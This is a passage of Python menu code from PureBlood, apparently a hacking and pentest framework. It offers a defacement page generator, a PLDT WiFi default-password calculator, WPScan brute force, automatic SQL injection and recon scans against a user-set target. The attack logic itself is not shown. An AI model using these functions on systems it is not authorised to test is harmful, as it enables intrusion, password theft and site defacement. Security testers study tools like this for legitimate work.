{1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            generator()\n    elif sys.version_info[0] == 2:\n        try:\n            choice = int(raw_input('{0}PureBlood{1}({3}Generator{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            generator()\n    cgenerator = Generator()\n    if choice == 1:\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        if sys.version_info[0] == 3:\n            title = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Title{1})> {2}'.format(green, blue, cyan, red)))\n            shortcut_icon = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Shortcut Icon{1})> {2}'.format(green, blue, cyan, red)))\n            meta_description = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Description{1})> {2}'.format(green, blue, cyan, red)))\n            meta_image = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Image{1})> {2}'.format(green, blue, cyan, red)))\n            logo = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Logo{1})> {2}'.format(green, blue, cyan, red)))\n            hacker_name = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Hacker Name{1})> {2}'.format(green, blue, cyan, red)))\n            message1 = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 1{1})> {2}'.format(green, blue, cyan, red)))\n            message2 = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 2{1})> {2}'.format(green, blue, cyan, red)))\n            groups = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Group/s{1})> {2}'.format(green, blue, cyan, red)))\n            deface_page_output_filename = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Output Filename{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            title = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Title{1})> {2}'.format(green, blue, cyan, red)))\n            shortcut_icon = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Shortcut Icon{1})> {2}'.format(green, blue, cyan, red)))\n            meta_description = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Description{1})> {2}'.format(green, blue, cyan, red)))\n            meta_image = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Image{1})> {2}'.format(green, blue, cyan, red)))\n            logo = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Logo{1})> {2}'.format(green, blue, cyan, red)))\n            hacker_name = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Hacker Name{1})> {2}'.format(green, blue, cyan, red)))\n            message1 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 1{1})> {2}'.format(green, blue, cyan, red)))\n            message2 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 2{1})> {2}'.format(green, blue, cyan, red)))\n            groups = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Group/s{1})> {2}'.format(green, blue, cyan, red)))\n            deface_page_output_filename = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Output Filename{1})> {2}'.format(green, blue, cyan, red)))\n        gdeface_page = cgenerator.deface_page(title, shortcut_icon, meta_description, meta_image, logo, hacker_name, message1, message2, groups)\n        if '.html' in deface_page_output_filename:\n            deface_page_output_filename = deface_page_output_filename\n        else:\n            deface_page_output_filename = deface_page_output_filename + '.html'\n        deface_page_output_file = open('outputs/generator/' + deface_page_output_filename, 'w+')\n        deface_page_output_file.write(gdeface_page)\n        deface_page_output_file.close()\n        print ('\\nOutput saved in outputs/generator/' + deface_page_output_filename + '{0}')\n        print (reset + bold)\n        print ('{0}='.format(red) * int(sizex))\n        generator()\n    elif choice == 2:\n        if sys.version_info[0] == 3:\n            length = int(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Length{1})> {2}'.format(green, blue, cyan, red)))\n            text = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            length = int(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Length{1})> {2}'.format(green, blue, cyan, red)))\n            text = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))\n        gpassword_generator1, gpassword_generator2, gpassword_generator3  = cgenerator.password_generator(length, text)\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        print ('Random Password: ' + gpassword_generator1)\n        print ('MD5: ' + gpassword_generator2)\n        print ('L33T: ' + gpassword_generator3)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        generator()\n    elif choice == 3:\n        if sys.version_info[0] == 3:\n            print ('{2}[{1}#{2}] {3}- {4}Last 5 Numbers if any. EX: PLDTHOMEDSLXXXXX where X is the number{0}'.format(reset, green, blue, yellow, cyan))\n            digit5 = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 Digit{1})> {2}'.format(green, blue, cyan, red)))\n            print ('{2}[{1}#{2}] {3}- {4}Last 5 MAC Characters. EX: 00:4a:00:d0:44:c0 where 044C0 is the last 5 MAC Characters{0}'.format(reset, green, blue, yellow, cyan))\n            mac5 = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 MAC Char{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            print ('{2}[{1}#{2}] {3}- {4}Last 5 Numbers if any. EX: PLDTHOMEDSLXXXXX where X is the number{0}'.format(reset, green, blue, yellow, cyan))\n            digit5 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 Digit{1})> {2}'.format(green, blue, cyan, red)))\n            print ('{2}[{1}#{2}] {3}- {4}Last 5 MAC Characters. EX: 00:4a:00:d0:44:c0 where 044C0 is the last 5 MAC Characters{0}'.format(reset, green, blue, yellow, cyan))\n            mac5 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 MAC Char{1})> {2}'.format(green, blue, cyan, red)))\n        gpldt_password_calculator1, gpldt_password_calculator2, gpldt_password_calculator3, gpldt_password_calculator4, gpldt_password_calculator5  = cgenerator.pldt_password_calculator(digit5, mac5)\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        print ('[#] - Possible Password of the PLDT WIFI:')\n        print ('\\nFOR : PLDTHOMEDSL, PLDTmyDSLPAL, and PLDTmyDSLBiz')\n        for i in gpldt_password_calculator1:\n            print (' > ' + i)\n        print ('\\nFOR : PLDTHOMEDSLxxxxx')\n        for i in gpldt_password_calculator2:\n            print (' > ' + i)\n        print ('\\nFOR : PLDTHOMEFIBR_xxxxxx')\n        print (' > ' + gpldt_password_calculator3)\n        print ('\\nFOR : PLDTHOMEFIBRxxxxxx')\n        for i in gpldt_password_calculator4:\n            print (' > ' + i)\n        print ('\\nFOR : HomeBro_Ultera')\n        print (' > ' + gpldt_password_calculator5)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        generator()\n    elif choice == 4:\n        if sys.version_info[0] == 3:\n            text = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}TextToHash{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            text = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}TextToHash{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))\n        gtext_to_hash = cgenerator.text_to_hash(text)\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        print (gtext_to_hash)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        generator()\n    elif choice == 90:\n        main()\n    elif choice == 99:\n        print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n        sys.exit()\n    else:\n        print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))\n        time.sleep(2)\n        print ('')\n        generator()\n\n\n\n'''def network_pentest():\n    print (\"\"\"\\n\\n\n{3}[ {5}Network Pentest {3}]\n\n    {2}01{3}) {5}?\n    {2}90{3}) {5}Back To Menu\n    {2}95{3}) {5}Set Target\n    {2}99{3}) {5}Exit\n\n{0}\"\"\".format(reset, red, green, blue, yellow, cyan))\n    if sys.version_info[0] == 3:\n        try:\n            choice = int(input('{0}PureBlood{1}({3}NetworkPentest{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            try:\n                print ('')\n                # print ('\\n[+] - Output saved in outputs/network_pentest/' + network_pentest_output)\n            except:\n                pass\n            print ('\\n{2}[{1}+{2}] {3}- {4}Exiting...{0}'.format(reset, green, blue, yellow, cyan))\n            sys.exit()\n        except ValueError:\n            print ('{2}[{1}+{2}] {3}- {4}Please enter a valid number!{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            main()\n    elif sys.version_info[0] == 2:\n        try:\n            choice = int(raw_input('{0}PureBlood{1}({3}NetworkPentest{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            try:\n                print ('')\n                # print ('\\n[+] - Output saved in outputs/network_pentest/' + network_pentest_output)\n            except:\n                pass\n            print ('\\n{2}[{1}+{2}] {3}- {4}Exiting...{0}'.format(reset, green, blue, yellow, cyan))\n            sys.exit()\n        except ValueError:\n            print ('{2}[{1}+{2}] {3}- {4}Please enter a valid number!{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            main()\n    if choice == 1:\n        main()\n    elif choice == 90:\n        main()\n    elif choice == 95:\n        print ('{2}[{1}#{2}] {3}- {4}Please don\\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))\n        if sys.version_info[0] == 3:\n            target = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            target = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n        set_target(target, 3)\n    elif choice == 99:\n        print ('\\n{2}[{1}+{2}] {3}- {4}Exiting...{0}'.format(reset, green, blue, yellow, cyan))\n        sys.exit()\n    else:\n        print ('{2}[{1}+{2}] {3}- {4}Please enter a valid choice!{0}'.format(reset, green, blue, yellow, cyan))\n        time.sleep(2)\n        network_pentest()'''\n\n\n\ndef web_application_attack():\n    global cweb_application_atttack\n    print (\"\"\"{3}[ {5}Web Application Attack {3}]\n\n    {2}01{3}) {5}Wordpress\n    {2}02{3}) {5}SQL Injection\n    {2}90{3}) {5}Back To Menu\n    {2}95{3}) {5}Set Target\n    {2}99{3}) {5}Exit\n{0}\"\"\".format(reset, red, green, blue, yellow, cyan))\n    if sys.version_info[0] == 3:\n        try:\n            choice = int(input('{0}PureBlood{1}({3}WebApplicationAttack{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n    elif sys.version_info[0] == 2:\n        try:\n            choice = int(raw_input('{0}PureBlood{1}({3}WebApplicationAttack{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n    cweb_application_atttack = WebApplicationAttack()\n    if choice == 1:\n        print (\"\"\"{3}[ {5}Web Application Attack {3}]\n\n    {2}01{3}) {5}WPScan (Kali Linux) - Install manually on other OS\n    {2}02{3}) {5}WPScan Bruteforce (Kali Linux) - Install manually on other OS\n    {2}03{3}) {5}Wordpress Plugins Vulnerability Checker\n    {2}90{3}) {5}Back To Menu\n    {2}95{3}) {5}Set Target\n    {2}99{3}) {5}Exit\n    {0}\"\"\".format(reset, red, green, blue, yellow, cyan))\n        if sys.version_info[0] == 3:\n            try:\n                choice1 = int(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Wordpress{1})> {2}'.format(green, blue, cyan, red)))\n            except KeyboardInterrupt:\n                print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n                sys.exit()\n            except ValueError:\n                print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n        elif sys.version_info[0] == 2:\n            try:\n                choice1 = int(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Wordpress{1})> {2}'.format(green, blue, cyan, red)))\n            except KeyboardInterrupt:\n                print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n                sys.exit()\n            except ValueError:\n                print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n        if choice1 == 1:\n            print ('{0}='.format(red) * int(sizex))\n            print (reset + bold)\n            try:\n                wap_wp_scan = cweb_application_atttack.wp_scan(url)\n            except NameError:\n                print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n                time.sleep(2)\n                web_application_attack()\n            print (reset)\n            print ('{0}='.format(red) * int(sizex))\n            web_application_attack()\n        elif choice1 == 2:\n            print ('{0}='.format(red) * int(sizex))\n            print (reset + bold)\n            try:\n                wap_wp_scan_bruteforce = cweb_application_atttack.wp_scan_bruteforce(url)\n            except NameError:\n                print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n                time.sleep(2)\n                web_application_attack()\n            print (reset)\n            print ('{0}='.format(red) * int(sizex))\n            print ('')\n            web_application_attack()\n        elif choice1 == 3: # Exploit-DB.com\n            print ('{0}='.format(red) * int(sizex))\n            print (reset + bold)\n            try:\n                wap_wordpress_plugin_checker = cweb_application_atttack.wordpress_vulnerability_check(url)\n            except NameError:\n                print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n                time.sleep(2)\n                web_application_attack()\n        elif choice1 == 90:\n            main()\n        elif choice1 == 95:\n            print ('{2}[{1}#{2}] {3}- {4}Please don\\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))\n            if sys.version_info[0] == 3:\n                target = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n            if sys.version_info[0] == 2:\n                target = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n            set_target(target, 2)\n        elif choice1 == 99:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        else:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n    elif choice == 2:\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        try:\n            wap_auto_sql_injection = cweb_application_atttack.auto_sql_injection(url)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_application_attack()\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        print ('')\n        web_application_attack()\n    elif choice == 90:\n        main()\n    elif choice == 95:\n        print ('{2}[{1}#{2}] {3}- {4}Please don\\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))\n        if sys.version_info[0] == 3:\n            target = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            target = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n        set_target(target, 2)\n    elif choice == 99:\n        print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n        sys.exit()\n    else:\n        print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))\n        time.sleep(2)\n        print ('')\n        web_application_attack()\n\n\n\ndef web_pentest():\n    global web_pentest_output\n    global web_pentest_outputfile\n    print (\"\"\"{3}[ {5}Web Pentest {3}]\n\n    {2}01{3}) {5}Banner Grab\n    {2}02{3}) {5}Whois\n    {2}03{3}) {5}Traceroute\n    {2}04{3}) {5}DNS Record\n    {2}05{3}) {5}Reverse DNS Lookup\n    {2}06{3}) {5}Zone Transfer Lookup\n    {2}07{3}) {5}Port Scan\n    {2}08{3}) {5}Admin Panel Scan\n    {2}09{3}) {5}Subdomain Scan\n    {2}10{3}) {5}CMS Identify\n    {2}11{3}) {5}Reverse IP Lookup\n    {2}12{3}) {5}Subnet Lookup\n    {2}13{3}) {5}Extract Page Links\n    {2}14{3}) {5}Directory Fuzz\n    {2}15{3}) {5}File Fuzz\n    {2}16{3}) {5}Shodan Search\n    {2}17{3}) {5}Shodan Host Lookup\n    {2}90{3}) {5}Back To Menu\n    {2}95{3}) {5}Set Target\n    {2}99{3}) {5}Exit\n{0}\"\"\".format(reset, red, green, blue, yellow, cyan))\n    if sys.version_info[0] == 3:\n        try:\n            choice = int(input('{0}PureBlood{1}({3}WebPentest{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            try:\n                print ('\\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)\n            except:\n                pass\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            web_pentest()\n    elif sys.version_info[0] == 2:\n        try:\n            choice = int(raw_input('{0}PureBlood{1}({3}WebPentest{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            try:\n                print ('\\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)\n            except:\n                pass\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            web_pentest()\n    cweb_pentest = WebPentest()\n    if choice == 1:\n        try:\n            wp_banner_grab = cweb_pentest.banner_grab(url)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Banner Grab Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_banner_grab)\n        web_pentest_outputfile.write('\\n' + wp_banner_grab)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 2:\n        try:\n            wp_whois = cweb_pentest.whois(url)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Whois Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_whois)\n        web_pentest_outputfile.write('\\n' + str(wp_whois))\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 3:\n        try:\n            wp_traceroute = cweb_pentest.traceroute(hostname)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Traceroute Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_traceroute)\n        web_pentest_outputfile.write('\\n' + wp_traceroute)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 4:\n        try:\n            wp_dns_record = cweb_pentest.dns_record(hostname)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] DNS Record Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        web_pentest_outputfile.write('\\n')\n        for i in wp_dns_record:\n            print (i)\n            web_pentest_outputfile.write(str(i) + '\\n')\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 5:\n        try:\n            wp_reverse_dns_lookup = cweb_pentest.reverse_dns_lookup(ip)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Reverse DNS Lookup Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_reverse_dns_lookup)\n        web_pentest_outputfile.write('\\n' + wp_reverse_dns_lookup)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 6:\n        try:\n            wp_zone_transfer_lookup = cweb_pentest.zone_transfer_lookup(hostname)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Zone Transfer Lookup Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_zone_transfer_lookup)\n        web_pentest_outputfile.write('\\n' + wp_zone_transfer_lookup)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 7:\n        if sys.version_info[0] == 3:\n            port_end = int(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}PortScan{1}>({3}Port End{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            port_end = int(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}PortScan{1}>({3}Port End{1})> {2}'.format(green, blue, cyan, red)))\n        try:\n            wp_port_scan = cweb_pentest.port_scan(hostname, port_end)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Port Scan Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        web_pentest_outputfile.write('\\n')\n        for i in wp_port_scan:\n            print (i)\n            web_pentest_outputfile.write(str(i) + '\\n')\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 8:\n        try:\n            wp_admin_panel_scan = cweb_pentest.admin_panel_scan(url)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Admin Panel Scan Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        web_pentest_outputfile.write('\\n')\n        for i in wp_admin_panel_scan:\n            print (i)\n            web_pentest_outputfile.write(str(i) + '\\n')\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 9:\n        if sys.version_info[0] == 3:\n            subdomain_list = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubdomainScan{1}>({3}Subdomain List{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            subdomain_list = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubdomainScan{1}>({3}Subdomain List{1})> {2}'.format(green, blue, cyan, red)))\n        try:\n            wp_subdomain_scan = cweb_pentest.subdomain_scan(hostname, subdomain_list)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        so_200, so_301, so_302, so_403 = wp_subdomain_scan\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Subdomain Scan Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        web_pentest_outputfile.write('\\n')\n        for i in so_200:\n            print ('[+] 200 - ' + i)\n            web_pentest_outputfile.write('[+] 200 - ' + i + '\\n')\n        for i in so_301:\n            print ('[!] 301 - ' + i)\n            web_pentest_outputfile.write('[+] 301 - ' + i + '\\n')\n        for i in so_302:\n            print ('[!] 302 - ' + i)\n            web_pentest_outputfile.write('[+] 302 - ' + i + '\\n')\n        for i in so_403:\n            print ('[!] 403 - ' + i)\n            web_pentest_outputfile.write('[+] 403 - ' + i + '\\n')\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 10:\n        try:\n            wp_cms_detect = cweb_pentest.cms_detect(hostname)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] CMS Detect - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_cms_detect)\n        web_pentest_outputfile.write('\\n' + wp_cms_detect)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 11:\n        try:\n            wp_reverse_ip_lookup = cweb_pentest.reverse_ip_lookup(hostname)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Reverse IP Lookup Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_reverse_ip_lookup)\n        web_pentest_outputfile.write('\\n' + wp_reverse_ip_lookup)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 12:\n        if sys.version_info[0] == 3:\n            subnet_input = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubnetLookup{1}>({3}CIDR or IP with NetMask{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            subnet_input = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubnetLookup{1}>({3}CIDR or IP with NetMask{1})> {2}'.format(green, blue, cyan, red)))\n        try:\n            wp_subnet_lookup = cweb_pentest.subnet_lookup(subnet_input)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * 